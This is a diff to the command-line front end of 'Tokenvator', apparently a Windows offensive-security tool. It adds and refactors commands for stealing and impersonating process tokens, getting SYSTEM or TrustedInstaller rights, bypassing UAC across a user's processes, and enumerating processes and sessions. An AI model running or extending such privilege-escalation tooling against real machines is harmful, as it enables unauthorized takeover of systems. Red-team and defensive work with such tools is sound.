@@ -19,9 +19,9 @@ namespace Tokenvator
         ////////////////////////////////////////////////////////////////////////////////
         static void Main(string[] args)
         {
-            Int32 processID;
-            String command;
             IntPtr currentProcessToken;
+            Dictionary<String, UInt32> users;
+            Dictionary<UInt32, String> processes;
             while (true)
             {
                 try
@@ -31,57 +31,79 @@ namespace Tokenvator
                     
                     switch(NextItem(ref input))
                     {
-                        case "listprivileges":
-                            Unmanaged.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
+                        case "list_privileges":
+                            kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
                             Tokens.EnumerateTokenPrivileges(currentProcessToken);
-                            Unmanaged.CloseHandle(currentProcessToken);
+                            kernel32.CloseHandle(currentProcessToken);
                             break;
-                        case "setprivilege":
-                            Unmanaged.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
+                        case "set_privilege":
+                            kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
                             Tokens.SetTokenPrivilege(ref currentProcessToken, input);
-                            Unmanaged.CloseHandle(currentProcessToken);
+                            kernel32.CloseHandle(currentProcessToken);
+                            break;
+                        case "list_processes":
+                            users = Enumeration.EnumerateTokens(false);
+                            Console.WriteLine("{0,-30}{1,-30}", "User", "ProcessID");
+                            Console.WriteLine("{0,-30}{1,-30}", "-----", "---------");
+                            foreach (String name in users.Keys)
+                            {
+                                Console.WriteLine("{0,-30}{1,-30}", name, users[name]);
+                            }
+                            break;
+                        case "list_processes_wmi":
+                            users = Enumeration.EnumerateTokensWMI();
+                            Console.WriteLine("{0,-30}{1,-30}", "User", "ProcessID");
+                            Console.WriteLine("{0,-30}{1,-30}", "-----", "---------");
+                            foreach (String name in users.Keys)
+                            {
+                                Console.WriteLine("{0,-30}{1,-30}", name, users[name]);
+                            }
+                            break; 
+                        case "find_user_processes":
+                            processes = Enumeration.EnumerateUserProcesses(false, input);
+                            Console.WriteLine("{0,-30}{1,-30}", "ProcessID", "Name");
+                            Console.WriteLine("{0,-30}{1,-30}", "---------", "----");
+                            foreach (UInt32 pid in processes.Keys)
+                            {
+                                Console.WriteLine("{0,-30}{1,-30}", pid, processes[pid]);
+                            }
+                            break;
+                        case "find_user_processes_wmi":
+                            processes = Enumeration.EnumerateUserProcessesWMI(input);
+                            Console.WriteLine("{0,-30}{1,-30}", "ProcessID", "Name");
+                            Console.WriteLine("{0,-30}{1,-30}", "---------", "----");
+                            foreach (UInt32 pid in processes.Keys)
+                            {
+                                Console.WriteLine("{0,-30}{1,-30}", pid, processes[pid]);
+                            }
+                            break;
+                        case "list_user_sessions":
+                            Enumeration.EnumerateInteractiveUserSessions();
                             break;
                         case "getsystem":
-                            if ("getsystem" == NextItem(ref input))
-                            {
-                                new Tokens().GetSystem();
-                            }
-                            else
-                            {
-                                new Tokens().GetSystem(input);
-                            }
+                            GetSystem(input);
                             break;
                         case "gettrustedinstaller":
-                            if ("gettrustedinstaller" == NextItem(ref input))
+                            GetTrustedInstaller(input);
+                            break;
+                        case "steal_token":
+                            StealToken(input);
+                            break;
+                        case "bypassuac":
+                            BypassUAC(input);
+                            break;
+                        case "whoami":
+                            Console.WriteLine("[*] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
+                            break;
+                        case "reverttoself":
+                            if (advapi32.RevertToSelf())
                             {
-                                new Tokens().GetTrustedInstaller();
+                                Console.WriteLine("[*] Reverted token to {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                             }
                             else
                             {
-                                new Tokens().GetTrustedInstaller(input);
+                                Console.WriteLine("RevertToSelf failed");
                             }
-                            break;
-                        case "stealtoken":
-                            if (GetProcessID(input, out processID, out command))
-                            {
-                                if (String.IsNullOrEmpty(command))
-                                {
-                                    new Tokens().ImpersonateUser(processID);
-                                }
-                                else
-                                {
-                                    new Tokens().StartProcessAsUser(processID, command);
-                                }
-                            }
-                            break;
-                        case "bypassuac":
-                            if (GetProcessID(input, out processID, out command))
-                            {
-                                new RestrictedToken().BypassUAC(processID, command);
-                            }
-                            break;
-                        case "whoami":
-                            Console.WriteLine(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                             break;
                         case "run":
                             Process process = new Process();
@@ -92,25 +114,16 @@ namespace Tokenvator
                             process.StartInfo.RedirectStandardOutput = true;
                             process.Start();
                             Console.WriteLine(process.StandardOutput.ReadToEnd());
+                            Console.WriteLine(process.StandardError.ReadToEnd());
                             process.WaitForExit();
                             break;
                         case "exit":
                             return;
                         default:
-                            Console.WriteLine();
-                            Console.WriteLine("Options");
-                            Console.WriteLine("-------");
-                            Console.WriteLine("GetSystem            <new_process>");
-                            Console.WriteLine("GetTrustedInstaller  <new_process>");
-                            Console.WriteLine("StealToken           <process_id> <new_process>");
-                            Console.WriteLine();
-                            Console.WriteLine("ListPrivileges       <process_id>");
-                            Console.WriteLine("SetPrivilege         <process_id> <privilege>");
-                            Console.WriteLine();
-                            Console.WriteLine("BypassUAC            <process_id> <new_process>");
-                            Console.WriteLine();
+                            Help();
                             break;
                     }
+                    Console.WriteLine();
                 }
                 catch (Exception error)
                 {
@@ -130,7 +143,8 @@ namespace Tokenvator
         {
             String name = NextItem(ref input);
             command = String.Empty;
-            if (!String.IsNullOrEmpty(input))
+
+            if (name != input)
             {
                 command = input;
             }
@@ -141,7 +155,7 @@ namespace Tokenvator
                 return true;
             }
 
-            Process[] process = Process.GetProcessesByName(input);
+            Process[] process = Process.GetProcessesByName(name);
             if (0 < process.Length)
             {
                 processID = process.First().Id;
@@ -168,6 +182,129 @@ namespace Tokenvator
                 option = input;
             }
             return option.ToLower();
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        public static void GetSystem(String input)
+        {
+            if ("getsystem" == NextItem(ref input))
+            {
+                using (Tokens t = new Tokens())
+                {
+                    t.GetSystem();
+                }
+            }
+            else
+            {
+                using (Tokens t = new Tokens())
+                {
+                    t.GetSystem(input);
+                }
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        public static void GetTrustedInstaller(String input)
+        {
+            if ("gettrustedinstaller" == NextItem(ref input))
+            {
+                using (Tokens t = new Tokens())
+                {
+                    t.GetTrustedInstaller();
+                }
+            }
+            else
+            {
+                using (Tokens t = new Tokens())
+                {
+                    t.GetTrustedInstaller(input);
+                }
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        public static void BypassUAC(String input)
+        {
+            Int32 processID;
+            String command;
+
+            if (GetProcessID(input, out processID, out command))
+            {
+                using (RestrictedToken rt = new RestrictedToken())
+                {
+                    rt.BypassUAC(processID, command);
+                }
+            }
+            else
+            {
+                String name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                Dictionary<UInt32, String> uacUsers = Enumeration.EnumerateUserProcesses(true, name);
+                foreach (UInt32 pid in uacUsers.Keys)
+                {
+                    Console.WriteLine("\n[*] Attempting Bypass with PID {0} ({1})", pid, uacUsers[pid]);
+                    using (RestrictedToken rt = new RestrictedToken())
+                    {
+                        rt.BypassUAC((Int32)pid, input);
+                    }
+                }
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        public static void StealToken(String input)
+        {
+            Int32 processID;
+            String command;
+
+            if (GetProcessID(input, out processID, out command))
+            {
+                if (String.IsNullOrEmpty(command))
+                {
+                    using (Tokens t = new Tokens())
+                    {
+                        t.ImpersonateUser(processID);
+                    }
+                }
+                else
+                {
+                    using (Tokens t = new Tokens())
+                    {
+                        t.StartProcessAsUser(processID, command);
+                    }
+                }
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        public static void Help()
+        {
+            String[,] options = new String[,] { 
+                {"Name", "Optional", "Required"}, {"----", "--------", "--------"}, 
+                {"GetSystem", "Command", "-"}, {"GetTrustedInstaller", "Command", "-"},
+                {"Steal_Token", "Command", "ProcessID"},
+                {"BypassUAC", "ProcessID", "Command"},
+                {"List_Privileges", "ProcessID", "-"}, {"Set_Privileges", "ProcessID", "Privilege"},
+                {"List_Processes", "-", "-"}, {"List_Processes_WMI", "-", "-"},
+                {"Find_User_Processes", "-", "User"}, {"Find_User_Processes_WMI", "-", "User"},
+                {"List_User_Sessions", "-", "-"},
+                {"WhoAmI", "-", "-"}, {"RevertToSelf", "-", "-"},
+                {"", "", ""}
+            };
+
+            for (Int32 i = 0; i < 15; i++)
+            {
+                Console.WriteLine("{0,-25}{1,-20}{2,-20}", options[i, 0], options[i, 1], options[i, 2]);
+            }
         }
     }
 }
